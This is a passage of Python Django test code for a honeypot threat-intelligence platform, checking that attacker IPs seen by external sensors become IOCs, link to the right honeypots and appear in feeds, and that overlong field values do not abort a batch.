        _link_sensor_honeypots(self.repo, self.ioc, [self._hit("")])
        self.assertEqual([hp.name for hp in self.ioc.honeypots.all()], [DEFAULT_EXTERNAL_HONEYPOT])
        self.assertTrue(Honeypot.objects.get(name=DEFAULT_EXTERNAL_HONEYPOT).active)

    def test_no_hits_still_links_external_honeypot(self):
        _link_sensor_honeypots(self.repo, self.ioc, [])
        self.assertEqual([hp.name for hp in self.ioc.honeypots.all()], [DEFAULT_EXTERNAL_HONEYPOT])


class TestExternalIocsReachFeeds(CustomTestCase):
    ATTACKER_IP = "193.32.162.44"

    def setUp(self):
        super().setUp()
        self.user = make_user(username="feed_link_user")
        self.api_source = make_api_source(self.user, name="FeedLinkSource")
        self.sensor = make_sensor(
            api_source=self.api_source,
            address="203.0.113.10",
            label="external-sensor",
            honeypot_software="SomeHoneypot",
        )
        self.batch = make_batch(self.api_source, task_id="task-feed-link")
        make_raw_event(self.batch, self.sensor, src_ip=self.ATTACKER_IP, event_type="login_attempt")

    @patch(PATCH_UPDATE_SCORES)
    def test_ingested_ioc_linked_to_sensor_honeypot(self, mock_scores_cls):
        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "completed")
        self.assertEqual(self.batch.ioc_count, 1)

        ioc = IOC.objects.get(name=self.ATTACKER_IP)
        self.assertEqual([hp.name for hp in ioc.honeypots.all()], ["SomeHoneypot"])

    @patch(PATCH_UPDATE_SCORES)
    def test_ingested_ioc_appears_in_feed(self, mock_scores_cls):
        process_incoming_event(self.api_source.id, self.batch.task_id)

        response = self.client.get("/api/feeds/all/all/recent.json")
        self.assertEqual(response.status_code, 200)
        values = [ioc["value"] for ioc in response.json()["iocs"]]
        self.assertIn(self.ATTACKER_IP, values)

    def _feed_values(self, url="/api/feeds/all/all/recent.json"):
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        return [ioc["value"] for ioc in response.json()["iocs"]]

    @patch(PATCH_UPDATE_SCORES)
    def test_ingested_ioc_is_filterable_by_its_honeypot(self, mock_scores_cls):
        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.assertIn(self.ATTACKER_IP, self._feed_values("/api/feeds/somehoneypot/all/recent.json"))

    @patch(PATCH_UPDATE_SCORES)
    def test_ioc_seen_by_two_sensors_is_linked_to_both_honeypots(self, mock_scores_cls):
        other_sensor = make_sensor(
            api_source=self.api_source,
            address="203.0.113.11",
            label="other-sensor",
            honeypot_software="OtherPot",
        )
        make_raw_event(self.batch, other_sensor, src_ip=self.ATTACKER_IP, event_type="login_attempt")

        process_incoming_event(self.api_source.id, self.batch.task_id)

        ioc = IOC.objects.get(name=self.ATTACKER_IP)
        self.assertEqual(sorted(hp.name for hp in ioc.honeypots.all()), ["OtherPot", "SomeHoneypot"])

    @patch(PATCH_UPDATE_SCORES)
    def test_sensor_without_software_falls_back_to_external(self, mock_scores_cls):
        self.sensor.honeypot_software = ""
        self.sensor.save(update_fields=["honeypot_software"])

        process_incoming_event(self.api_source.id, self.batch.task_id)

        ioc = IOC.objects.get(name=self.ATTACKER_IP)
        self.assertEqual([hp.name for hp in ioc.honeypots.all()], [DEFAULT_EXTERNAL_HONEYPOT])
        self.assertIn(self.ATTACKER_IP, self._feed_values())

    @patch(PATCH_UPDATE_SCORES)
    def test_deactivated_honeypot_hides_ioc_but_keeps_the_link(self, mock_scores_cls):
        Honeypot.objects.create(name="QuietPot", active=False)
        self.sensor.honeypot_software = "QuietPot"
        self.sensor.save(update_fields=["honeypot_software"])

        process_incoming_event(self.api_source.id, self.batch.task_id)

        ioc = IOC.objects.get(name=self.ATTACKER_IP)
        self.assertEqual([hp.name for hp in ioc.honeypots.all()], ["QuietPot"])
        self.assertNotIn(self.ATTACKER_IP, self._feed_values())

    @patch(PATCH_UPDATE_SCORES)
    def test_legacy_overlong_software_does_not_fail_the_batch(self, mock_scores_cls):
        """
        A sensor registered before the serializer cap can hold more than
        Honeypot.name accepts; that must not abort the whole batch.
        """
        Sensor.objects.filter(pk=self.sensor.pk).update(honeypot_software="a" * 40)

        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "completed")
        self.assertIn(self.ATTACKER_IP, self._feed_values())

    @patch(PATCH_UPDATE_SCORES)
    def test_second_batch_reuses_the_same_honeypot_row(self, mock_scores_cls):
        process_incoming_event(self.api_source.id, self.batch.task_id)

        second_batch = make_batch(self.api_source, task_id="task-feed-link-2")
        make_raw_event(second_batch, self.sensor, src_ip="185.220.101.7", event_type="login_attempt")
        process_incoming_event(self.api_source.id, second_batch.task_id)

        self.assertEqual(Honeypot.objects.filter(name="SomeHoneypot").count(), 1)
        values = self._feed_values()
        self.assertIn(self.ATTACKER_IP, values)
        self.assertIn("185.220.101.7", values)


class TestLongProtocolDoesNotFailBatch(CustomTestCase):
    """
    A protocol accepted by EventSerializer must fit Credential.protocol.

    Both are 50 characters wide; when Credential.protocol was narrower, an event
    carrying a longer value raised a DataError inside the atomic block and rolled
    back every IOC in the batch.
    """

    ATTACKER_A = "193.32.162.44"
    ATTACKER_B = "185.220.101.7"

    def setUp(self):
        self.user = make_user(username="long_proto_user")
        self.api_source = make_api_source(self.user, name="LongProtoSource")
        self.sensor = make_sensor(api_source=self.api_source, address="203.0.113.55", honeypot_software="Cowrie")
        self.batch = make_batch(self.api_source, task_id="task-long-proto")

    def _event(self, src_ip, protocol):
        make_raw_event(
            self.batch,
            self.sensor,
            src_ip=src_ip,
            event_type="login_attempt",
            username="admin",
            password="hunter2",
            protocol=protocol,
        )

    @patch(PATCH_UPDATE_SCORES)
    def test_max_length_protocol_completes_the_batch(self, mock_scores):
        self._event(self.ATTACKER_A, "p" * 50)
        self._event(self.ATTACKER_B, "ssh")

        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.batch.refresh_from_db()
        self.assertEqual(self.batch.status, "completed")
        self.assertEqual(self.batch.last_error, "")
        self.assertEqual(self.batch.ioc_count, 2)

    @patch(PATCH_UPDATE_SCORES)
    def test_long_protocol_does_not_discard_the_other_iocs(self, mock_scores):
        self._event(self.ATTACKER_A, "p" * 50)
        self._event(self.ATTACKER_B, "ssh")

        process_incoming_event(self.api_source.id, self.batch.task_id)

        self.assertTrue(IOC.objects.filter(name=self.ATTACKER_A).exists())
        self.assertTrue(IOC.objects.filter(name=self.ATTACKER_B).exists())
        self.assertEqual(RawEvent.objects.filter(batch=self.batch, processed=False).count(), 0)

    @patch(PATCH_UPDATE_SCORES)
    def test_long_protocol_is_stored_untruncated(self, mock_scores):
        self._event(self.ATTACKER_A, "p" * 50)

        process_incoming_event(self.api_source.id, self.batch.task_id)

        credential = Credential.objects.get(username="admin", password="hunter2")
        self.assertEqual(credential.protocol, "p" * 50)

    def test_credential_protocol_matches_the_event_field_widths(self):
        """The three widths must agree, otherwise an accepted event cannot be persisted."""
        from api.serializers.events import EventSerializer

        credential_width = Credential._meta.get_field("protocol").max_length
        self.assertEqual(credential_width, RawEvent._meta.get_field("protocol").max_length)
        self.assertEqual(credential_width, EventSerializer().fields["protocol"].max_length)
